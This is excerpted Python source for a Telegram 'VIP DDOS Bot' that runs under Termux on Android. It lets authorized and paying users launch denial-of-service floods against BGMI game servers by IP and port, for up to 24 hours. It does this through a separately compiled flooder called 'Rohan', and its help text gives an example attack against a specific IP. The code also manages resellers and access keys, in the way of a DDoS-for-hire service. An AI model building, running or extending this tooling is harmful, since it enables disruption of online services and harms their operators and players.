...
authorized_users = {}
last_attack_time = {}
running_attacks = {}  # Track running attack processes (in-memory only)
...
def escape_markdown_v2(text):
    """Escape special characters for Telegram MarkdownV2, but allow emojis."""
    special_chars = r'([_*[\]()~`>#+\-=|{}.!])'
...
def get_android_version():
    ...
    try:
        if "Android" in platform.system():
            # Termux sets this environment variable
...
def check_system_resources(chat_id):
    """Check CPU and memory before starting an attack, optimized for Android 7 to 16."""
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    # Adjust thresholds based on Android version
    android_version = get_android_version()
    if android_version == "Unknown" or android_version == "Not Android":
        cpu_limit = 90
        memory_limit = 90
    else:
        # Lower thresholds for older Android versions (7-9)
        try:
    ...
    if cpu_usage > cpu_limit:
        bot.send_message(chat_id, f"Error: CPU usage too high (>{cpu_limit}%). Try again later.")
        return False
    if memory_usage > memory_limit:
        bot.send_message(chat_id, f"Error: Memory usage too high (>{memory_limit}%). Try again later.")
        return False
    return True
...
def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        ...
        if not os.path.isfile("./Rohan") or not os.access("./Rohan", os.X_OK):
            bot.send_message(chat_id, "Error: Rohan executable not found or not executable. Compile Rohan.c and place it in the same directory.")
            return
        attack_id = f"{user_id}_{int(time.time())}"
        # Command to launch the attack instantly
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        start_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        response = f"🎮 BGMI Server Attack Started 🔥\nID: {attack_id}\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nAttacker: @{username}\nStarted at: {start_time}"
        bot.send_message(chat_id, response)
        # Start the attack instantly using subprocess
        ...
        # Schedule the attack to stop instantly after the specified time
        threading.Timer(time, lambda: stop_attack_instantly(attack_id, chat_id), []).start()
    except Exception as e:
...
def stop_attack_instantly(attack_id, chat_id):
    if attack_id in running_attacks:
        ...
        try:
            # Instantly terminate the process using SIGKILL
            ...
            bot.send_message(chat_id, f"🎮 BGMI Server Attack Completed 🔥\nID: {attack_id}\nTarget: {attack_info['target']}:{attack_info['port']}\nEnded at: {end_time}")
...
def handle_attack(message):
    ...
    try:
        port = int(command[2])
        time = int(command[3])
        # Validate port for BGMI
        if port < 1 or port > 65535:
            bot.reply_to(message, "Error: Port must be between 1 and 65535")
            return
        if port in INCORRECT_PORTS or is_sequential_port(port):
            bot.reply_to(message, "Error: This is not a valid BGMI port. Use ports like 27881 or 16520.")
            return
        # Allow long durations up to 24 hours
        if time > MAX_ATTACK_DURATION:
            bot.reply_to(message, f"Error: Time must be less than {MAX_ATTACK_DURATION} seconds (24 hours)")
            return
        if time < 1:
            bot.reply_to(message, "Error: Time must be at least 1 second")
            return
...
**POWER MANAGEMENT**:
- /attack <ip> <port> <time> - Launch a BGMI server attack (e.g., /attack 20.235.93.150 16520 300)
...
**NOTE**:
- Use BGMI ports like 27881 or 16520 for attacks.
- Attacks can run up to 24 hours on Android 7 to 16 devices.
"""
    ...
    escaped_help_text = '\n'.join(escaped_lines)
    bot.reply_to(message, escaped_help_text, parse_mode='MarkdownV2')
...
def my_info(message):
    ...
    android_version = get_android_version()
    response += f"Device: Android {android_version}\n"
    if user_id in admin_id:
...
def start_command(message):
    android_version = get_android_version()
    bot.reply_to(message, f"Welcome to the VIP DDOS Bot! 🎮\nRunning on Android {android_version}\nUse /help to see available commands.")

# Initialize data and start the bot
def initialize_files():
    """Initialize required JSON files if they don't exist."""
    files = [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE]
    for file in files:
